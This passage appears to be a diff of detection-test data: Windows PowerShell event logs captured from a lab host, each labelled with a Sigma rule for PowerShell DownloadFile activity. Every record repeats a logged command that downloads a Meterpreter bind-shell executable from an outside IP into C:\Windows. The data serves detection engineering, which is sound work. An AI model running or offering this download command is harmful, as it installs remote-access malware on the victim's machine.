+                "message": "Engine state is changed from None to Available. \n\nDetails: \n\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=82f501e0-7931-4934-9d32-d46517111bf7\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "engine": {
+                        "new_state": "Available",
+                        "previous_state": "None",
+                        "version": "5.1.19041.1237"
+                    },
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7"
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 400,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6595,
+                    "task": "Engine Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.838+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.838Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Provider Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 600,
+                    "created": "2022-10-10T11:17:51.427Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 1,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Provider \"Registry\" is Started. \n\nDetails: \n\tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "provider": {
+                        "name": "Registry",
+                        "new_state": "Started"
+                    }
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 600,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6589,
+                    "task": "Provider Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.838+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.838Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Provider Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 600,
+                    "created": "2022-10-10T11:17:51.428Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 5,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Provider \"Environment\" is Started. \n\nDetails: \n\tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "provider": {
+                        "name": "Environment",
+                        "new_state": "Started"
+                    }
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 600,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6591,
+                    "task": "Provider Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.838+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.838Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Provider Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 600,
+                    "created": "2022-10-10T11:17:51.428Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 7,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Provider \"FileSystem\" is Started. \n\nDetails: \n\tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "provider": {
+                        "name": "FileSystem",
+                        "new_state": "Started"
+                    }
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 600,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6592,
+                    "task": "Provider Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.838+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.838Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Provider Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 600,
+                    "created": "2022-10-10T11:17:51.429Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 11,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Provider \"Variable\" is Started. \n\nDetails: \n\tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "provider": {
+                        "name": "Variable",
+                        "new_state": "Started"
+                    }
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 600,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6594,
+                    "task": "Provider Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.838+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:51.107Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Pipeline Execution Details",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 800,
+                    "created": "2022-10-10T11:17:51.432Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 15,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Pipeline execution details for command line: $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\"). \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=15\n\n\tUserId=CLIENT1\\ssh\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=82f501e0-7931-4934-9d32-d46517111bf7\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\") \n\nDetails: \nCommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"",
+                "powershell": {
+                    "command": {
+                        "invocation_details": [
+                            {
+                                "related_command": "New-Object",
+                                "type": "CommandInvocation",
+                                "value": "\"New-Object\""
+                            },
+                            {
+                                "name": "\"TypeName\"",
+                                "related_command": "New-Object",
+                                "type": "ParameterBinding",
+                                "value": "\"System.Net.WebClient\""
+                            }
+                        ],
+                        "value": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+                    },
+                    "engine": {
+                        "version": "5.1.19041.1237"
+                    },
+                    "pipeline_id": "1",
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7",
+                    "sequence": 1,
+                    "total": 1
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "related": {
+                    "user": "ssh"
+                },
+                "user": {
+                    "domain": "CLIENT1",
+                    "name": "ssh"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 800,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6596,
+                    "task": "Pipeline Execution Details"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:51.107+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:51.114Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Executing Pipeline",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 4103,
+                    "created": "2022-10-10T11:17:51.434Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "Microsoft-Windows-PowerShell",
+                    "sequence": 16,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = 99dc06f6-7551-484b-b322-01da00740dca\n        Host Application = powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n        Engine Version = 5.1.19041.1237\n        Runspace ID = 82f501e0-7931-4934-9d32-d46517111bf7\n        Pipeline ID = 1\n        Command Name = New-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 16\n        User = CLIENT1\\ssh\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
+                "powershell": {
+                    "command": {
+                        "invocation_details": [
+                            {
+                                "related_command": "New-Object",
+                                "type": "CommandInvocation",
+                                "value": "\"New-Object\""
+                            },
+                            {
+                                "name": "\"TypeName\"",
+                                "related_command": "New-Object",
+                                "type": "ParameterBinding",
+                                "value": "\"System.Net.WebClient\""
+                            }
+                        ],
+                        "name": "New-Object",
+                        "type": "Cmdlet"
+                    },
+                    "engine": {
+                        "version": "5.1.19041.1237"
+                    },
+                    "id": "Microsoft.PowerShell",
+                    "pipeline_id": "1",
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7"
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "related": {
+                    "user": "ssh"
+                },
+                "user": {
+                    "domain": "CLIENT1",
+                    "name": "ssh"
+                },
+                "winlog": {
+                    "activity_id": "{d359db81-dc8e-0001-e777-5ed38edcd801}",
+                    "api": "wineventlog",
+                    "channel": "Microsoft-Windows-PowerShell/Operational",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 4103,
+                    "opcode": "To be used when operation is just executing a method",
+                    "process": {
+                        "pid": 4368,
+                        "thread": {
+                            "id": 696
+                        }
+                    },
+                    "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
+                    "provider_name": "Microsoft-Windows-PowerShell",
+                    "record_id": 6090,
+                    "task": "Executing Pipeline",
+                    "user": {
+                        "domain": "CLIENT1",
+                        "identifier": "S-1-5-21-2755423373-3250654863-1302750906-1003",
+                        "name": "ssh",
+                        "type": "User"
+                    },
+                    "version": 1
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:51.114+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:51.166Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Pipeline Execution Details",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 800,
+                    "created": "2022-10-10T11:17:51.433Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 17,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=17\n\n\tUserId=CLIENT1\\ssh\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=82f501e0-7931-4934-9d32-d46517111bf7\n\tPipelineId=1\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(Out-Default): \"Out-Default\"",
+                "powershell": {
+                    "command": {
+                        "invocation_details": [
+                            {
+                                "related_command": "Out-Default",
+                                "type": "CommandInvocation",
+                                "value": "\"Out-Default\""
+                            }
+                        ]
+                    },
+                    "engine": {
+                        "version": "5.1.19041.1237"
+                    },
+                    "pipeline_id": "1",
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7",
+                    "sequence": 1,
+                    "total": 1
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "related": {
+                    "user": "ssh"
+                },
+                "user": {
+                    "domain": "CLIENT1",
+                    "name": "ssh"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 800,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6597,
+                    "task": "Pipeline Execution Details"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:51.166+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:51.166Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
